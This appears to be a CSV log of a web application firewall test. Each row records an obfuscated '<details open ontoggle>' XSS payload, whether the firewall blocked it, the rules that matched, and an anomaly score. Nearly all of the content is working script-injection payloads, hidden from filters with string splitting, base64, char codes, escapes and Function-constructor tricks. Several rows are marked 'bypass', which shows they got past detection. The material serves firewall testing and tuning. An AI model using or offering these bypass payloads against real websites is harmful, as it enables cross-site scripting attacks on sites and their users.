997,"<details open ontoggle=""setTimeout(function(){document.body.appendChild(document.createElement('script')).textContent='al'+'ert(1)';},0)"">",0,1,block,5,"934100,934100,941100,941120,949110","o35,11v217,138 || o35,11v217,138t:urlDecodeUni || v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826580718.241531
998,"<details open ontoggle=""setInterval(function(){with(document)with(body)appendChild(createElement('script')).text='al'+'ert(1)';clearInterval(arguments.callee);},0)"">",0,1,block,5,"934100,934100,941100,941120,949110","o36,11v217,165 || o36,11v217,165t:urlDecodeUni || v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826580994.504897
999,"<details open ontoggle=""setTimeout(function(){document['body']['appendChild'](document['createElement']('script'))['text']='al'+'ert(1)';},0)"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o34,107v217,143t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,143 || o35,11v217,143t:urlDecodeUni || v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,16v217,143t:urlDecodeUni,t:compressWhitespace || ",30,177826581126.905155
1000,"<details open ontoggle=""setTimeout(function(){with(document)with(body)appendChild(createElement('script')).text=self['ale'+'rt'](1);},0)"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o116,20v217,138t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,138 || o35,11v217,138t:urlDecodeUni || v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o51,77v217,138t:urlDecodeUni,t:compressWhitespace || ",30,177826581390.627275
1001,"<details open ontoggle=""setTimeout(function(){with(document)with(body)appendChild(createElement('script')).text=top['al'+'ert'](1);},0)"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o115,20v217,137t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,137 || o35,11v217,137t:urlDecodeUni || v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o51,76v217,137t:urlDecodeUni,t:compressWhitespace || ",30,177826581540.370616
1004,"<details open ontoggle=""setTimeout(function(){var s=document.createElement('script');s.text='al'+'ert(1)';document.body.appendChild(s);},0)"">",0,1,block,5,"934100,934100,941100,941120,949110","o35,11v217,141 || o35,11v217,141t:urlDecodeUni || v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826582142.476167
1005,"<details open ontoggle=""setTimeout(function(){(document.body.appendChild(document.createElement('script'))).text='al'.concat('ert(1)');},0)"">",0,1,block,5,"933210,934100,941100,941120,949110","o34,105v217,141t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,141 || v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826582371.641917
1008,"<details open ontoggle=""setTimeout(function(){with(document)with(body)appendChild(createElement('script')).text=decodeURI('%61%6c%65%72%74%28%31%29');},0)"">",0,1,block,5,"934100,934100,941100,941120,949110","o35,11v217,156 || o35,11v217,156t:urlDecodeUni || v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826583031.977989
1009,"<details open ontoggle=""setTimeout(function(){with(document)with(body)appendChild(createElement('script')).text=unescape('%61%6c%65%72%74%28%31%29');},0)"">",0,1,block,5,"934100,934100,941100,941120,949110","o35,11v217,155 || o35,11v217,155t:urlDecodeUni || v217,155t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,155t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826583263.966414
1010,"<details open ontoggle=""setTimeout(function(){with(document)with(body)appendChild(createElement('script')).text=/ale/.source+'rt(1)';},0)"">",0,1,block,5,"934100,934100,941100,941120,949110","o35,11v217,139 || o35,11v217,139t:urlDecodeUni || v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826583427.354664
1011,"<details open ontoggle=""var a=Object.getPrototypeOf(Function).constructor;new a(atob('YWxlcnQoMSk='))()"">",0,1,bypass,2,"941100,941120","v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826583773.557796
1015,"<details open ontoggle=""var a=(function(){}).constructor;new a(atob('YWxlcnQoMSk='))()"">",0,1,block,4,"934100,941100,941120,949110","o31,11v217,88 || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826584549.407675
1021,"<details open ontoggle=""var b=window['ato'+'b'],a=Function;new a(b('YWxlcnQoMSk='))()"">",0,1,block,4,"941100,941120,941370,949110","v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,17v217,87t:urlDecodeUni,t:compressWhitespace || ",15,177826585847.043129
1022,"<details open ontoggle=""var a=Function,b=self['a'+'tob'];new a(b('YWxlcnQoMSk='))()"">",0,1,block,4,"941100,941120,941370,949110","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,15v217,85t:urlDecodeUni,t:compressWhitespace || ",15,177826586012.448452
1023,"<details open ontoggle=""var a=Function;new a(self['a'+'to'+'b']('YWxlcnQoMSk='))()"">",0,1,block,5,"933210,941100,941120,941370,949110","o44,38v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,18v217,84t:urlDecodeUni,t:compressWhitespace || ",20,17782658628.655711
1025,"<details open ontoggle=""var a=Function;new a(String.fromCharCode(97,108,101,114,116,40,49,41))()"">",0,1,block,4,"934100,941100,941120,949110","o45,19v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826586667.379453
1026,"<details open ontoggle=""var a=Function;new a(['ale'+'rt','(1)'].join(''))()"">",0,1,bypass,2,"941100,941120","v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826586832.751319
1027,"<details open ontoggle=""var a=Function;new a(`${'ale'}${'rt'}(1)`)()"">",0,1,block,5,"932130,933180,941100,941120,949110","o45,11v217,70t:urlDecodeUni,t:cmdLine || o46,22v217,70 || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826587131.277643
1028,"<details open ontoggle=""var a=Function;new a(unescape(decodeURI('%61%6c%65%72%74%28%31%29')))()"">",0,1,bypass,2,"941100,941120","v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826587331.991614
1029,"<details open ontoggle=""var a=Function;(new a(atob('YWxlcnQoMSk=')))()"">",0,1,bypass,2,"941100,941120","v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826587564.130388
1030,"<details open ontoggle=""var a=Function,c=a.prototype.constructor;new c(atob('YWxlcnQoMSk='))()"">",0,1,bypass,2,"941100,941120","v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826587726.287597
1031,"<details open ontoggle='(function(){return eval(""al""+""ert(1)"")})()'>",0,1,block,6,"933160,934100,934100,941100,941120,949110","o43,23v217,68 || o25,11v217,68 || o25,11v217,68t:urlDecodeUni || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826587962.411217
1048,"<details open ontoggle='(new function(){return eval(""al""+""ert(1)"")})()'>",0,1,block,6,"933160,934100,934100,941100,941120,949110","o47,23v217,72 || o29,11v217,72 || o29,11v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826591596.811346
1050,"<details open ontoggle='(Reflect.construct(Function,[""al""+""ert(1)""]))()'>",0,1,bypass,2,"941100,941120","v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826591971.408344
1053,"<details open ontoggle='(function(){var a=atob(""YWxlcnQ"");top[a](1)})()'>",0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o57,4v217,73 || o61,10v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,73 || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o58,6v217,73t:urlDecodeUni,t:compressWhitespace || ",30,177826592648.597077
1055,<details open ontoggle='(function(){var a=`al`+`er`+`t`;parent[a](1)})()'>,0,1,block,6,"933210,934100,934100,941100,941120,949110","o62,10v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,74 || o25,11v217,74t:urlDecodeUni || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17782659303.341706
1059,"<details open ontoggle='(function(){var a=String[`fromCharCode`](97)+String[`fromCharCode`](108,101,114,116);globalThis[a](1)})()'>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o119,10v217,131t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,131 || o25,11v217,131t:urlDecodeUni || v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826593894.648113
1060,"<details open ontoggle='(function(){let a=String.fromCharCode(97);a+=String.fromCharCode(108,101,114,116);self[a](1)})()'>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o110,10v217,122t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,122 || o25,11v217,122t:urlDecodeUni || v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o106,7v217,122t:urlDecodeUni,t:compressWhitespace || ",30,177826594071.755965
1062,"<details open ontoggle='(function(){var a=String.fromCharCode(0x61,0154,0x65,0162,0x74);top[a](1)})()'>",0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o87,4v217,103 || o91,10v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,6v217,103t:urlDecodeUni,t:compressWhitespace || ",30,177826594493.156734
1063,"<details open ontoggle='(function(){var a=String.fromCharCode(97,108)+String.fromCharCode(101,114,116);globalThis[a](1)})()'>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o113,10v217,125t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,125 || o25,11v217,125t:urlDecodeUni || v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826594676.426739
1065,"<details open ontoggle='(function(){var a=[0x61,0x6c,0x65,0x72,0x74].map(x=>String.fromCharCode(x)).join("""");parent[a](1)})()'>",0,1,block,5,"933210,934100,941100,941120,949110","o115,10v217,127t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,127 || v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826595015.533777
1066,"<details open ontoggle='(function(){var c=String.fromCharCode,a=c(97)+c(108)+c(101)+c(114)+c(116);top[a](1)})()'>",0,1,block,8,"932105,933210,934100,934100,941100,941120,941370,949110","o97,4v217,113 || o101,10v217,113t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,113 || o25,11v217,113t:urlDecodeUni || v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o98,6v217,113t:urlDecodeUni,t:compressWhitespace || ",35,177826595236.904988
1068,"<details open ontoggle='(function(){var a=String[""fromCharCode""](97,108,101,114,116);frames[0]?frames[0][a](1):self[a](1)})()'>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o48,77v217,127t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,127 || v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o111,7v217,127t:urlDecodeUni,t:compressWhitespace || ",25,177826595718.234607
1070,"<details open ontoggle='(function(){var a=String.fromCharCode.apply(null,[97,108,101,114,116]);top[a](1)})()'>",0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o94,4v217,110 || o98,10v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,110 || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o95,6v217,110t:urlDecodeUni,t:compressWhitespace || ",30,177826596143.782351
1071,"<details open ontoggle='(function(){with(this)[][""constructor""][""constructor""](""ale""+""rt(1)"")()})()'></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,75v217,111t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,111 || o25,11v217,111t:urlDecodeUni || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,7v217,111t:urlDecodeUni,t:compressWhitespace || ",30,177826596365.543240
1072,"<details open ontoggle='(function(){with(this)this[""e""+""val""](""ale""+""rt(1)"")})()'></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,56v217,92t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,92 || o25,11v217,92t:urlDecodeUni || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,20v217,92t:urlDecodeUni,t:compressWhitespace || ",30,177826596559.214679
1074,"<details open ontoggle='(function(){with(this)self[""eval"".charAt(0)+""val""](""ale""+""rt(1)"")})()'></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,69v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,105 || o25,11v217,105t:urlDecodeUni || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,33v217,105t:urlDecodeUni,t:compressWhitespace || ",30,177826597048.403119
1075,"<details open ontoggle='(function(){with(this)top[String.fromCharCode(101,118,97,108)](""ale""+""rt(1)"")})()'></details>",0,1,block,6,"934100,934100,941100,941120,941370,949110","o25,11v217,117 || o25,11v217,117t:urlDecodeUni || v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,45v217,117t:urlDecodeUni,t:compressWhitespace || ",25,177826597213.444140
1076,"<details open ontoggle='(function(){with(this)parent[""e\u0076al""](""ale""+""rt(1)"")})()'></details>",0,1,block,6,"934100,934100,941100,941120,941370,949110","o25,11v217,96 || o25,11v217,96t:urlDecodeUni || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,24v217,96t:urlDecodeUni,t:compressWhitespace || ",25,177826597470.684185
1078,"<details open ontoggle='(function(){with(this)globalThis[atob(""ZXZhbA=="")](""ale""+""rt(1)"")})()'></details>",0,1,block,6,"934100,934100,941100,941120,941370,949110","o25,11v217,105 || o25,11v217,105t:urlDecodeUni || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,33v217,105t:urlDecodeUni,t:compressWhitespace || ",25,17782659783.931337
1079,"<details open ontoggle='(function(){with(this)this[""\145\166\141\154""](""ale""+""rt(1)"")})()'></details>",0,1,block,6,"934100,934100,941100,941120,941370,949110","o25,11v217,101 || o25,11v217,101t:urlDecodeUni || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,29v217,101t:urlDecodeUni,t:compressWhitespace || ",25,17782659809.102236
1080,"<details open ontoggle='(function(){with(this)Function(""ale""+""rt(1)"")()})()'></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,51v217,87t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,87 || o25,11v217,87t:urlDecodeUni || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17782659826.206356
1081,"<details open ontoggle='(function(){with(this)setTimeout(""ale""+""rt(1)"")})()'></details>",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,87 || o25,11v217,87t:urlDecodeUni || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826598447.002422
1082,"<details open ontoggle='(function(){with(this)setInterval(""ale""+""rt(1)"")})()'></details>",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,88 || o25,11v217,88t:urlDecodeUni || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826598755.075564
1083,"<details open ontoggle='(function(){with(this)[][""find""][""constructor""](""ale""+""rt(1)"")()})()'></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,68v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,104 || o25,11v217,104t:urlDecodeUni || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,7v217,104t:urlDecodeUni,t:compressWhitespace || ",30,177826598949.995081
1085,"<details open ontoggle='(function(){with(this)location[""constructor""][""constructor""](""ale""+""rt(1)"")()})()'></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,81v217,117t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,117 || o25,11v217,117t:urlDecodeUni || v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,28v217,117t:urlDecodeUni,t:compressWhitespace || ",30,177826599334.147357
1089,"<details open ontoggle='(function(){with(this)Reflect.construct(Function,[""ale""+""rt(1)""])()})()'></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o73,22v217,107t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,107 || o25,11v217,107t:urlDecodeUni || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,47v217,107t:urlDecodeUni,t:compressWhitespace || ",30,177826600141.832658
1090,"<details open ontoggle='(function(){with(this)new Function(""ale""+""rt(1)"").call()})()'></details>",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,96 || o25,11v217,96t:urlDecodeUni || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826600334.569403
1093,"<details open ontoggle='(top[""Function""](""al""+""ert(1)""))()'></details>",0,1,block,5,"933210,941100,941120,941370,949110","o24,34v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,15v217,70t:urlDecodeUni,t:compressWhitespace || ",20,177826601094.416535
1101,"<details open ontoggle='(parent.Function(""al""+""ert(1)""))()'></details>",0,1,bypass,2,"941100,941120","v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826602649.836949
1102,"<details open ontoggle='(Function[""prototype""][""constructor""][""call""](null,""al""+""ert(1)""))()'></details>",0,1,block,4,"933210,941100,941120,949110","o24,68v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826602872.850850
1105,"<details open ontoggle='(globalThis[""Function""](""al""+""ert(1)""))()'></details>",0,1,block,4,"933210,941100,941120,949110","o24,41v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17782660358.028626
1107,"<details open ontoggle='(Reflect.construct(Function,[""al""+""ert(1)""]))()'></details>",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826603926.502169
1108,"<details open ontoggle='(async function(){}.constructor(""al""+""ert(1)""))()'></details>",0,1,block,5,"934100,934100,941100,941120,949110","o31,11v217,85 || o31,11v217,85t:urlDecodeUni || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826604164.725985
1110,"<details open ontoggle='((function(){}).constructor.constructor(""al""+""ert(1)""))()'></details>",0,1,block,5,"934100,934100,941100,941120,949110","o26,11v217,93 || o26,11v217,93t:urlDecodeUni || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826604587.524042
